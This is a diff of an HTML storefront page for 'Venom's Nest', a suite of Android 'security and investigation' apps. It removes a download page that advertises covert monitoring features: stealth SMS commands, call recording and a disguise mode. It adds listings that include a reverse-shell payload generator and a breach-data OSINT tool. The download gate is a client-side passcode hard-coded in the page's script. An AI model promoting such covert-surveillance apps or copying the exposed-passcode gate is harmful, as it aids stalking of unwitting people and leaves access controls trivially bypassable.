@@ -3,43 +3,297 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Link Up Elite - Download</title>
-    <style>
-        * { box-sizing: border-box; }
-        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); color: #fff; min-height: 100vh; margin: 0; display: flex; align-items: center; justify-content: center; }
-        .container { text-align: center; padding: 40px 20px; max-width: 600px; }
-        h1 { font-size: 2.5rem; margin-bottom: 10px; }
-        .subtitle { color: #a0a0a0; margin-bottom: 40px; }
-        .download-btn { display: inline-block; background: #4CAF50; color: white; padding: 18px 40px; text-decoration: none; border-radius: 8px; font-size: 1.2rem; font-weight: bold; transition: all 0.3s; }
-        .download-btn:hover { background: #45a049; transform: scale(1.05); }
-        .version { margin-top: 20px; color: #888; font-size: 0.9rem; }
-        .features { text-align: left; margin-top: 40px; background: rgba(255,255,255,0.1); padding: 20px; border-radius: 8px; }
-        .features h3 { margin-top: 0; color: #4CAF50; }
-        .features ul { padding-left: 20px; }
-        .features li { margin: 8px 0; color: #ccc; }
-        .footer { margin-top: 40px; color: #666; font-size: 0.8rem; }
-    </style>
+    <title>Venom's Nest - Professional Security & Investigation Tools</title>
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
 </head>
 <body>
-    <div class="container">
-        <h1>Link Up Elite</h1>
-        <p class="subtitle">Remote Video Monitoring Application</p>
-        <a href="https://venoms-nest-downloads.s3.amazonaws.com/linkupelite/LinkUpElite-v2.6.apk" class="download-btn">Download APK</a>
-        <p class="version">Version 2.6 | 53.8 MB | Android 8.0+</p>
-        <div class="features">
-            <h3>Features</h3>
-            <ul>
-                <li>Live HD video streaming via SRT/RTMP</li>
-                <li>SMS remote control commands</li>
-                <li>Stealth data SMS mode (invisible commands)</li>
-                <li>Dual camera support (front/rear)</li>
-                <li>GPS location sharing</li>
-                <li>Background operation with battery optimization</li>
-                <li>Call recording capability</li>
-                <li>Disguise mode</li>
-            </ul>
+    <!-- Header -->
+    <header class="header">
+        <div class="container">
+            <div class="logo">
+                <span class="logo-icon">&#9762;</span>
+                <span class="logo-text">Venom's Nest</span>
+            </div>
+            <nav class="nav">
+                <a href="#apps">Apps</a>
+                <a href="#about">About</a>
+                <a href="#contact">Contact</a>
+            </nav>
         </div>
-        <p class="footer">iDEA Technology Solutions</p>
-    </div>
+    </header>
+
+    <!-- Hero Section -->
+    <section class="hero">
+        <div class="hero-bg"></div>
+        <div class="container">
+            <h1 class="hero-title">Venom's Nest</h1>
+            <p class="hero-subtitle">Professional Security & Investigation Tools</p>
+            <p class="hero-description">A suite of powerful Android applications designed for security professionals, investigators, and privacy-conscious individuals.</p>
+            <a href="#apps" class="btn btn-primary">Explore Apps</a>
+        </div>
+    </section>
+
+    <!-- Apps Grid -->
+    <section id="apps" class="apps-section">
+        <div class="container">
+            <h2 class="section-title">The Suite</h2>
+            <p class="section-subtitle">8 powerful tools for security and investigation</p>
+
+            <div class="apps-grid">
+                <!-- MacVenom Pro -->
+                <div class="app-card">
+                    <div class="app-icon-img">
+                        <img src="images/macvenom-pro.png" alt="MacVenom Pro">
+                    </div>
+                    <h3 class="app-name">MacVenom Pro</h3>
+                    <p class="app-tagline">Security Testing Payload Generator</p>
+                    <p class="app-description">Professional-grade payload generator for authorized penetration testing. Supports reverse shells, bind shells, meterpreter, and exec payloads across ARM, x86, x64, and MIPS architectures.</p>
+                    <div class="app-features">
+                        <span class="feature-tag">Penetration Testing</span>
+                        <span class="feature-tag">Multi-Architecture</span>
+                    </div>
+                    <a href="#" onclick="return checkPasscode('https://venoms-nest-downloads.s3.amazonaws.com/apps/macvenom-pro.apk', 'MacVenom Pro')" class="btn btn-download">
+                        <span class="download-icon">&#8595;</span> Download APK
+                    </a>
+                </div>
+
+                <!-- Socialpede -->
+                <div class="app-card">
+                    <div class="app-icon-img">
+                        <img src="images/Socialpede.png" alt="Socialpede">
+                    </div>
+                    <h3 class="app-name">Socialpede</h3>
+                    <p class="app-tagline">Data Aggregation for Crime Investigation</p>
+                    <p class="app-description">Comprehensive OSINT tool for authorized investigations. Aggregates crime incidents, social profiles, breach data, and geolocation information from multiple sources.</p>
+                    <div class="app-features">
+                        <span class="feature-tag">OSINT</span>
+                        <span class="feature-tag">Investigation</span>
+                        <span class="feature-tag">Data Aggregation</span>
+                    </div>
+                    <a href="#" onclick="return checkPasscode('https://venoms-nest-downloads.s3.amazonaws.com/apps/socialpede.apk', 'Socialpede')" class="btn btn-download">
+                        <span class="download-icon">&#8595;</span> Download APK
+                    </a>
+                </div>
+
+                <!-- RFScorpion -->
+                <div class="app-card">
+                    <div class="app-icon-img">
+                        <img src="images/RFScorpion.png" alt="RF Scorpion">
+                    </div>
+                    <h3 class="app-name">RF Scorpion</h3>
+                    <p class="app-tagline">RF Detection & Security Tool</p>
+                    <p class="app-description">Professional RF detection suite featuring cell tower survey, IMSI catcher detection, GPS tracker detection, Bluetooth skimmer scanning, and EMF analysis with 10-layer security architecture.</p>
+                    <div class="app-features">
+                        <span class="feature-tag">IMSI Catcher Detection</span>
+                        <span class="feature-tag">Skimmer Detection</span>
+                        <span class="feature-tag">EMF Analysis</span>
+                    </div>
+                    <a href="#" onclick="return checkPasscode('https://venoms-nest-downloads.s3.amazonaws.com/apps/rfscorpion.apk', 'RF Scorpion')" class="btn btn-download">
+                        <span class="download-icon">&#8595;</span> Download APK
+                    </a>
+                </div>
+
+                <!-- IPLizard -->
+                <div class="app-card">
+                    <div class="app-icon-img">
+                        <img src="images/IPLizard.png" alt="IP Lizard">
+                    </div>
+                    <h3 class="app-name">IP Lizard</h3>
+                    <p class="app-tagline">Network OSINT & IP Intelligence</p>
+                    <p class="app-description">Advanced IP investigation tool with geolocation, WHOIS lookups, DNS analysis, and threat intelligence integration. Supports AbuseIPDB, VirusTotal, and Shodan APIs.</p>
+                    <div class="app-features">
+                        <span class="feature-tag">IP Geolocation</span>
+                        <span class="feature-tag">Threat Intel</span>
+                        <span class="feature-tag">WHOIS/DNS</span>
+                    </div>
+                    <a href="#" onclick="return checkPasscode('https://venoms-nest-downloads.s3.amazonaws.com/apps/iplizard.apk', 'IP Lizard')" class="btn btn-download">
+                        <span class="download-icon">&#8595;</span> Download APK
+                    </a>
+                </div>
+
+                <!-- PCMD Live -->
+                <div class="app-card">
+                    <div class="app-icon-img">
+                        <img src="images/PCMD Live.png" alt="PCMD Live">
+                    </div>
+                    <h3 class="app-name">PCMD Live</h3>
+                    <p class="app-tagline">Multi-Carrier PCMD Analyzer</p>
+                    <p class="app-description">Professional cell tower data analysis tool supporting Verizon, AT&T, and T-Mobile. Features RTT, VoLTE, NELOS, and TODA data parsing with hot tower identification and V-Strike analysis.</p>
+                    <div class="app-features">
+                        <span class="feature-tag">Cell Tower Analysis</span>
+                        <span class="feature-tag">Multi-Carrier</span>
+                        <span class="feature-tag">Location Mapping</span>
+                    </div>
+                    <a href="#" onclick="return checkPasscode('https://venoms-nest-downloads.s3.amazonaws.com/apps/pcmdlive.apk', 'PCMD Live')" class="btn btn-download">
+                        <span class="download-icon">&#8595;</span> Download APK
+                    </a>
+                </div>
+
+                <!-- ToadCAM -->
+                <div class="app-card">
+                    <div class="app-icon-img">
+                        <img src="images/ToadCAM.png" alt="Toad CAM">
+                    </div>
+                    <h3 class="app-name">Toad CAM</h3>
+                    <p class="app-tagline">Surveillance Detection & Camera Discovery</p>
+                    <p class="app-description">Professional surveillance detection tool for law enforcement and security professionals. Features real-time camera detection, lens reflection scanning, IR analysis, and OSINT-powered camera mapping for comprehensive area surveillance assessment.</p>
+                    <div class="app-features">
+                        <span class="feature-tag">Camera Detection</span>
+                        <span class="feature-tag">OSINT Mapping</span>
+                        <span class="feature-tag">Area Assessment</span>
+                    </div>
+                    <a href="#" onclick="return checkPasscode('https://venoms-nest-downloads.s3.amazonaws.com/apps/toadcam.apk', 'Toad CAM')" class="btn btn-download">
+                        <span class="download-icon">&#8595;</span> Download APK
+                    </a>
+                </div>
+
+                <!-- Link Up -->
+                <div class="app-card">
+                    <div class="app-icon linkup">
+                        <span>&#128279;</span>
+                    </div>
+                    <h3 class="app-name">Link Up</h3>
+                    <p class="app-tagline">Secure Audio Streaming</p>
+                    <p class="app-description">Professional audio streaming application with SRT and RTMP support. Features local recording, SMS link distribution, and discrete operation mode for field use.</p>
+                    <div class="app-features">
+                        <span class="feature-tag">SRT/RTMP Streaming</span>
+                        <span class="feature-tag">Audio Recording</span>
+                        <span class="feature-tag">SMS Distribution</span>
+                    </div>
+                    <a href="#" onclick="return checkPasscode('https://venoms-nest-downloads.s3.amazonaws.com/apps/Link%20UP.apk', 'Link Up')" class="btn btn-download">
+                        <span class="download-icon">&#8595;</span> Download APK
+                    </a>
+                </div>
+
+                <!-- Link Up Elite -->
+                <div class="app-card featured">
+                    <div class="featured-badge">PRO</div>
+                    <div class="app-icon linkup-elite">
+                        <span>&#128279;</span>
+                    </div>
+                    <h3 class="app-name">Link Up Elite</h3>
+                    <p class="app-tagline">Advanced Audio Streaming Suite</p>
+                    <p class="app-description">Enhanced version with additional streaming options, extended contact lists, advanced recording features, and priority support. Ideal for professional deployments.</p>
+                    <div class="app-features">
+                        <span class="feature-tag">Extended Features</span>
+                        <span class="feature-tag">Priority Support</span>
+                        <span class="feature-tag">Pro License</span>
+                    </div>
+                    <a href="#" onclick="return checkPasscode('https://venoms-nest-downloads.s3.amazonaws.com/apps/linkup-elite.apk', 'Link Up Elite')" class="btn btn-download btn-elite">
+                        <span class="download-icon">&#8595;</span> Download APK
+                    </a>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- About Section -->
+    <section id="about" class="about-section">
+        <div class="container">
+            <h2 class="section-title">About Venom's Nest</h2>
+            <div class="about-content">
+                <div class="about-text">
+                    <p>Venom's Nest is a collection of professional-grade security and investigation tools developed by <strong>iDEA Technology Solutions</strong>. Our applications are designed for:</p>
+                    <ul class="about-list">
+                        <li>Security professionals conducting authorized assessments</li>
+                        <li>Law enforcement with proper authorization</li>
+                        <li>Privacy-conscious individuals protecting personal security</li>
+                        <li>Investigators performing legitimate inquiries</li>
+                    </ul>
+                    <p class="warning-text">All applications are intended for authorized use only. Users are responsible for compliance with applicable laws and regulations.</p>
+                </div>
+                <div class="about-stats">
+                    <div class="stat">
+                        <span class="stat-number">8</span>
+                        <span class="stat-label">Applications</span>
+                    </div>
+                    <div class="stat">
+                        <span class="stat-number">Android</span>
+                        <span class="stat-label">Platform</span>
+                    </div>
+                    <div class="stat">
+                        <span class="stat-number">Pro</span>
+                        <span class="stat-label">Grade Tools</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Installation Guide -->
+    <section class="install-section">
+        <div class="container">
+            <h2 class="section-title">Installation Guide</h2>
+            <div class="install-steps">
+                <div class="step">
+                    <div class="step-number">1</div>
+                    <h4>Download APK</h4>
+                    <p>Click the download button for your desired application</p>
+                </div>
+                <div class="step">
+                    <div class="step-number">2</div>
+                    <h4>Enable Unknown Sources</h4>
+                    <p>Go to Settings > Security > Enable "Install from Unknown Sources"</p>
+                </div>
+                <div class="step">
+                    <div class="step-number">3</div>
+                    <h4>Install & Activate</h4>
+                    <p>Open the APK file and enter your license key when prompted</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Contact Section -->
+    <section id="contact" class="contact-section">
+        <div class="container">
+            <h2 class="section-title">Contact & Support</h2>
+            <div class="contact-grid">
+                <div class="contact-card">
+                    <h4>Technical Support</h4>
+                    <p><a href="mailto:Janellae@ideatech.us">Janellae@ideatech.us</a></p>
+                    <p>Main Office: <a href="tel:+17088080719">(708) 808-0719</a></p>
+                </div>
+                <div class="contact-card">
+                    <h4>Licensing</h4>
+                    <p><a href="mailto:Sales@ideatech.us">Sales@ideatech.us</a></p>
+                </div>
+                <div class="contact-card">
+                    <h4>Website</h4>
+                    <p><a href="https://www.ideatech.us" target="_blank">www.ideatech.us</a></p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-logo">
+                    <span class="logo-icon">&#9762;</span>
+                    <span>Venom's Nest</span>
+                </div>
+                <p class="footer-text">&copy; 2024 iDEA Technology Solutions. All Rights Reserved.</p>
+                <p class="footer-disclaimer">For authorized use only. Users must comply with all applicable laws.</p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Download Protection Script -->
+    <script>
+        function checkPasscode(url, appName) {
+            var code = prompt('Enter download passcode for ' + appName + ':\n\nContact Sales@ideatech.us or (708) 808-0719 for access.');
+            if (code !== null && code.toUpperCase().trim() === 'NEST-ACCESS') {
+                window.location.href = url;
+            } else if (code !== null) {
+                alert('Invalid passcode.\n\nContact:\nSales@ideatech.us\nJanellae@ideatech.us\n(708) 808-0719');
+            }
+            return false;
+        }
+    </script>
 </body>
 </html>
